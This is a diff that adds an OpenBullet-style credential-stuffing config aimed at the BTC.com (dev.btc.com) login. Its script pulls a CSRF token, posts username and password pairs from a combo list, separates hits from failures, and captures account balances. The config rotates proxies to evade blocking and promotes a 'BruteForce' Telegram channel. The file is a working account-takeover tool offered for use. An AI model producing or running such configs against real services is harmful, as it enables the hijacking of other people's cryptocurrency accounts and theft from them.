@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "BTC.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-29T01:33:41.7810881+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Need HQ Proxy | Capture | CPM Rate: 20-500",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#SHA FUNCTION Hash SHA512 "<PASS>" -> VAR "SHA" 
+
+#GET REQUEST GET "https://dev.btc.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://dev.btc.com/login" 
+
+#TOKEN PARSE "<SOURCE>" LR "_token\" value=\"" "\">" -> VAR "TOKEN" 
+
+#POST REQUEST POST "https://dev.btc.com/login" 
+  CONTENT "_token=<TOKEN>&browser_fingerprint=1b1b4d8c31eecb06fcb9d431dfd1c135&login=<USER>&password=<SHA>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://dev.btc.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Failed to verify password" 
+  KEYCHAIN Success OR 
+    KEY "Overview" 
+
+#Balances PARSE "<SOURCE>" LR "<td class=\"param-type text-center\">" "</td>" Recursive=TRUE -> CAP "Balances" 
+
+#CC FUNCTION Constant " T.me/BruteForce " -> CAP " Telegram Channel:" 
+
